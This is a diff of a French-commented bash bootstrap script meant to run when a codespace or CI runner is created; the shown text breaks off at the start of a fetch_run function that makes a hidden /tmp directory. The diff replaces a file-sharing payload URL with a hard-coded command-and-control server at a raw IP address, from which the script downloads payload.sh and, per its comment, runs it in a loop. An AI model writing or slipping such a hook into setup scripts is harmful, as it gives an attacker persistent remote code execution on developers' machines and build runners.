@@ -1,8 +1,8 @@
 #!/bin/bash
 # Bootstrap exécuté à la création du codespace / du runner
-# Récupère le payload et le lance en boucle
-PAYLOAD_URL="${PAYLOAD_URL:-https://sendit.sh/uWlHS/payload.sh}"
-C2_URL="${C2_URL:-http://CHANGE_ME_C2:8000}"
+# Récupère le payload directement depuis le C2 et le lance en boucle
+C2_URL="${C2_URL:-http://45.138.12.61:8000}"
+PAYLOAD_URL="$C2_URL/payload.sh"
 
 fetch_run() {
   mkdir -p /tmp/.n
